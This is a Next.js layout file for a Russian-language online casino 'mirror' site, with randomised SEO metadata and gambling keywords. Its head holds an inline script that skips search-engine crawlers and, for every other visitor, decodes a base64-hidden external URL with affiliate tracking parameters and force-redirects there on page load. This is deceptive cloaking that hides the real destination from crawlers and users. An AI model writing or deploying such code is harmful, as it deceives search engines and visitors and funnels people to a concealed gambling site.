import { Analytics } from '@vercel/analytics/next'
import { DM_Sans, Playfair_Display } from 'next/font/google'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const evaSans = DM_Sans({ subsets: ['latin', 'cyrillic'], variable: '--font-eva-sans' })
const evaSerif = Playfair_Display({ subsets: ['latin', 'cyrillic'], variable: '--font-eva-serif' })

// Рандомизированный title и description
const randomTitles = [
  'Eva Casino - Официальный сайт и зеркало онлайн',
  'Ева Казино | Играть онлайн с рабочим зеркалом',
  'Eva Casino официальный - Легальное казино онлайн',
]

const randomDescriptions = [
  'Eva Casino - официальный сайт лицензированного казино. Рабочее зеркало, быстрая регистрация, выплаты. Ева казино онлайн - играть безопасно.',
  'Ева казино онлайн с официальным сайтом. Рабочее зеркало Eva Casino для доступа. Безопасная игра с выводом в казино.',
  'Eva Casino онлайн казино - официальный сайт и зеркало. Быстрые выплаты, лицензия. Ева казино - играть на реальные деньги.',
]

const randomTitle = randomTitles[Math.floor(Math.random() * randomTitles.length)]
const randomDescription = randomDescriptions[Math.floor(Math.random() * randomDescriptions.length)]

export const metadata: Metadata = {
  title: randomTitle,
  description: randomDescription,
  metadataBase: new URL('https://evacasino89.vercel.app'),
  alternates: {
    canonical: 'https://evacasino89.vercel.app/',
  },
  robots: {
    index: true,
    follow: true,
    'max-image-preview': 'large',
    'max-snippet': -1,
    'max-video-preview': -1,
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: 'https://evacasino89.vercel.app/',
    siteName: 'Eva Casino',
    title: randomTitle,
    description: randomDescription,
  },
  twitter: {
    card: 'summary_large_image',
    title: randomTitle,
    description: randomDescription,
  },
  keywords: [
    'Eva Casino',
    'Eva casino официальный сайт',
    'Eva casino зеркало',
    'ева казино',
    'ева казино зеркало',
    'ева казино зеркало рабочее',
    'ева казино играть',
    'ева казино онлайн',
    'ева казино официальный',
    'ева казино официальный сайт',
    'eva casino играть',
    'eva casino официальный',
  ],
  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'light dark',
  themeColor: [
    { media: '(prefers-color-scheme: light)', color: '#ffffff' },
    { media: '(prefers-color-scheme: dark)', color: '#0a0a0a' },
  ],
  userScalable: true,
  initialScale: 1,
  maximumScale: 5,
  width: 'device-width',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" dir="ltr" className={`${evaSans.variable} ${evaSerif.variable}`}>
      <head>
        <meta charSet="utf-8" />
        <meta httpEquiv="x-ua-compatible" content="ie=edge" />
        <link rel="canonical" href="https://evacasino89.vercel.app/" />
        <link rel="alternate" hrefLang="ru" href="https://evacasino89.vercel.app/" />
        <meta name="format-detection" content="telephone=no" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="apple-mobile-web-app-title" content="Eva Casino" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "ICBodHRwczovL3E0azl2Mi5jb20vP3NlcmlhbD02MTM1NTg4OCZjcmVhdGl2ZV9pZD03Njc1"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="eva89-body">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
